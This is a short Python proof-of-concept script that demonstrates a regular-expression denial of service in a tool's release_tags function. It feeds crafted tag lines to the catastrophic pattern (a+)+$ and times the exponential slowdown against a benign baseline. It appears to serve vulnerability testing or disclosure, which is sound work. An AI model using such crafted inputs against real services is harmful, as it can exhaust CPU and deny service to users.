#!/usr/bin/env python3
"""PoC: ReDoS via tag_regex on attacker-controlled tags (pin-watch release_tags)."""
import importlib.util, time, sys

spec = importlib.util.spec_from_file_location(
    "pinwatch", "/fast/scratch/kama-r41/clone/tools/pin-watch.py")
pw = importlib.util.module_from_spec(spec)
spec.loader.exec_module(pw)

import re
# catastrophic pattern: nested quantifier (a+)+ with a non-matching tail
BAD = r"(a+)+$"
rx = re.compile(BAD)

def bench(n):
    line = "a" * n + "b"          # forces backtracking on fullmatch
    text = "0" * 40 + "\trefs/tags/" + line + "\n"
    t0 = time.perf_counter()
    try:
        tags = pw.release_tags(text, rx)
        dt = time.perf_counter() - t0
        return dt, len(tags), None
    except Exception as e:
        dt = time.perf_counter() - t0
        return dt, -1, type(e).__name__

print("catastrophic regex", BAD)
prev = None
for n in (10, 12, 14, 16, 18, 20, 22, 24, 26, 28):
    dt, nt, exc = bench(n)
    growth = f"x{dt/prev:.1f}" if prev else "-"
    print(f"n={n:3d} time={dt:.4f}s growth={growth} tags={nt} exc={exc}")
    prev = dt
    if dt > 25:
        print("aborting; >25s")
        break

# baseline: benign lane regex on 2000-line tag list
sem = re.compile(r"v(\d+)\.(\d+)\.(\d+)")
lines = "".join(f"{'0'*40}\trefs/tags/v{i}.{i}.{i}\n" for i in range(2000))
t0 = time.perf_counter()
pw.release_tags(lines, sem)
print(f"benign v(\\d+)\\.(\\d+)\\.(\\d+) over 2000 tags: {time.perf_counter()-t0:.4f}s")
